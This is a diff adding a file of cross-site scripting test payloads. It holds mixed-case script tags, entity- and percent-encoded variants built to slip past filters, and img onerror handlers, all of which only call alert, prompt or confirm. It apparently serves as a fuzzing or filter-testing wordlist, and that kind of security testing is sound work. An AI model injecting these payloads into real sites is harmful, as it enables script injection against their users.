@@ -1,0 +1,42 @@
+&lt;script&gt;alert(&#x27;asp&#x27;);&lt;/script&gt;
+&lt;scRIpt&gt;alert(&#x27;asp&#x27;);&lt;/ScRiPt&gt;
+&lt;sCrIpT&gt;prompt(&#x27;python&#x27;);&lt;/ScRiPt&gt;
+&lt;sCrIpT&gt;confirm(&#x27;cobol&#x27;);&lt;/ScRiPt&gt;
+&#x24;&#x6c;&#x74;&#x3b;script&#x24;&#x67;&#x74;&#x3b;alert(&#x27;asp&#x27;);&#x24;&#x6c;&#x74;&#x3b;/script&#x24;&#x67;&#x74;&#x3b;
+&#x24;&#x6c;&#x74;&#x3b;scRIpt&#x24;&#x67;&#x74;&#x3b;alert(&#x27;asp&#x27;);&#x24;&#x6c;&#x74;&#x3b;/ScRiPt&#x24;&#x67;&#x74;&#x3b;
+&#x24;&#x6c;&#x74;&#x3b;sCrIpT&#x24;&#x67;&#x74;&#x3b;prompt(&#x27;python&#x27;);&#x24;&#x6c;&#x74;&#x3b;/ScRiPt&#x24;&#x67;&#x74;&#x3b;
+&#x24;&#x6c;&#x74;&#x3b;sCrIpT&#x24;&#x67;&#x74;&#x3b;confirm(&#x27;cobol&#x27;);&#x24;&#x6c;&#x74;&#x3b;/ScRiPt&#x24;&#x67;&#x74;&#x3b;
+%26%6c%74%3bscript&gt;alert(&#x27;asp&#x27;);%26%6c%74%3b/script&gt;
+%26%6c%74%3bscRIpt&gt;alert(&#x27;asp&#x27;);%26%6c%74%3b/ScRiPt&gt;
+%26%6c%74%3bsCrIpT&gt;prompt(&#x27;python&#x27;);%26%6c%74%3b/ScRiPt&gt;
+%26%6c%74%3bsCrIpT&gt;confirm(&#x27;cobol&#x27;);%26%6c%74%3b/ScRiPt&gt;
+%26%67%74%3bscript%26%6c%74%3balert(&#x27;asp&#x27;);%26%67%74%3b/script%26%6c%74%3b
+%26%67%74%3bscRIpt%26%6c%74%3balert(&#x27;asp&#x27;);%26%67%74%3b/ScRiPt%26%6c%74%3b
+%26%67%74%3bsCrIpT%26%6c%74%3bprompt(&#x27;python&#x27;);%26%67%74%3b/ScRiPt%26%6c%74%3b
+%26%67%74%3bsCrIpT%26%6c%74%3bconfirm(&#x27;cobol&#x27;);%26%67%74%3b/ScRiPt%26%6c%74%3b
+&lt;scriptJmd0Ow==alert(&#x27;asp&#x27;);&lt;/scriptJmd0Ow==
+&lt;scRIptJmd0Ow==alert(&#x27;asp&#x27;);&lt;/ScRiPtJmd0Ow==
+&lt;sCrIpTJmd0Ow==prompt(&#x27;python&#x27;);&lt;/ScRiPtJmd0Ow==
+&lt;sCrIpTJmd0Ow==confirm(&#x27;cobol&#x27;);&lt;/ScRiPtJmd0Ow==
+&lt;scriptJTI2JTY3JTc0JTNialert(&#x27;asp&#x27;);&lt;/scriptJTI2JTY3JTc0JTNi
+&lt;scRIptJTI2JTY3JTc0JTNialert(&#x27;asp&#x27;);&lt;/ScRiPtJTI2JTY3JTc0JTNi
+&lt;sCrIpTJTI2JTY3JTc0JTNiprompt(&#x27;python&#x27;);&lt;/ScRiPtJTI2JTY3JTc0JTNi
+&lt;sCrIpTJTI2JTY3JTc0JTNiconfirm(&#x27;cobol&#x27;);&lt;/ScRiPtJTI2JTY3JTc0JTNi
+onerror=prompt(4)
+onerror=prompt%281%29
+onerror=prompt%2899%29
+onerror=prompt&#x289&#x29;
+#<img/src=””onerror=alert(9)>
+#<img src="" onerror=alert(4) >
+#<img src="" onerror=prompt(4) >
+#img src="" onerror=confirm(4) >
+#img src="" onerror=prompt(4) >
+#<<img src="" onerror=pRoMpT(3) >
+#<<img src="" onerror=cOnFiRm(3) >
+#<img/src="" onerror=alert(7)>
+#<img/src="" onerror=prompt(7)>
+#img/src="" onerror=confirm(3)>
+#img/src="" onerror=prompt(3)>
+#<<img/src="" onerror=pRoMpT(6)>
+#<<img/src="" onerror=cOnFiRm(6)>
+%23<img%2Fsrc%3D””onerror%3Dprompt%289%29>
